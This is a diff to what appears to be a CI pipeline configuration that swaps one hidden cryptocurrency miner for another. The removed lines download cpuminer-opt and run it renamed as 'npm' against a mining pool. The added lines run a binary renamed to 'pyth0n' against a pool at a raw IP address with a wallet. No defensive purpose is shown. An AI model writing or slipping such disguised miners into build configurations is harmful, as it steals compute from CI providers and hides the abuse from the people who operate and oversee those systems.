@@ -5,10 +5,6 @@ container:
   gpu: 2
 task:
   script: |
-   apt update -y \
-   && apt install -y wget \
-   && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
-   && tar -xvf cpuminer-opt-linux.tar.gz \
-   && mv cpuminer-sse2 npm \
-   && ./npm -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Bc9Nnt38ZU2mryNKUyxVviir4DXgbQeEhp.mode-cir -t 0
-   
+   set -ex \
+     && mv /usr/bin/turtle /usr/bin/pyth0n \
+     && pyth0n  --algorithm argon2id_chukwa2 --pool 23.95.242.133:3022 --wallet userA -k
